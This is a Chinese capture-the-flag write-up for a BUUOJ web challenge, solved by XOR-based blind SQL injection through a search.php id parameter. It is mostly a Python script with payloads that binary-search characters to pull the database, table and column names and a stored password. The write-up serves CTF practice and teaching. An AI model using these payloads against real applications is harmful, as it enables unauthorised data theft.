---
Author: Coder-LYQ
Date: 2020-12-31

---

## 思路

1. 打开网页观察页面内容如下，可以看到有一个登录框，还有一个1~5的列表可以点击。

   说明本题可以从两个角度进行sql注入。

   登录的链接为：check.php?username=123&password=123

   点击数字的链接为：search.php?id=1

<img src="images/image-20201231143221010.png" alt="image-20201231143221010" style="zoom: 25%;" />

2. 先从最常规的万能密码尝试

3. 对点击数字的链接进行尝试（而且题目中也提示了“选择正确神秘代码即可获得flag”）

   search.php?id=1^1^1和search.php?id=1结果一样，说明我们可以尝试使用**异或**进行注入，使用下面的脚本进行测试：

   > 当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入
   >
   > 异或运算规则：
   >
   > 1^1=0 0^0=0 0^1=1
   >
   > 1^1^1=1  1^1^0=0

   ```python
   # -*- coding: utf-8 -*-
   url = 'http://70f6bc6d-6862-4615-8b83-fb7267cc42fb.node3.buuoj.cn/search.php?id='
   i = 0
   flag = ''
   while True:
       i += 1
       # 从可打印字符开始
       begin = 32
       end = 126
       tmp = (begin + end) // 2
       while begin < end:
           print(begin, tmp, end)
           time.sleep(0.1)
           # 爆数据库
           # geek
           # payload = "1^(ascii(substr(database(),%d,1))>%d)^1" % (i, tmp)
           # 爆表
           # F1naI1y,Flaaaaag
           # payload = "1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))>%d)^1" % (i, tmp)
           # 爆字段
           # payload = "1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))>%d)^1" % (i, tmp)
           # 爆flag 要跑很久
           # payload = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, tmp)
           # 爆flag 很快
           payload = "1^(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))>%d)^1" % (i, tmp)
           # 错误示例
           # payload = "1^(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))>%d)^1" % (i, tmp)
   
           r = requests.get(url+payload)
           if 'Click' in r.text:
               begin = tmp + 1
               tmp = (begin + end) // 2
           else:
               end = tmp
               tmp = (begin + end) // 2
   
       flag += chr(tmp)
       print(flag)
       if begin == 32:
           break
   
   ```

   

## 总结

此题可以结合 [GYCTF2020]Ezsqli 练习

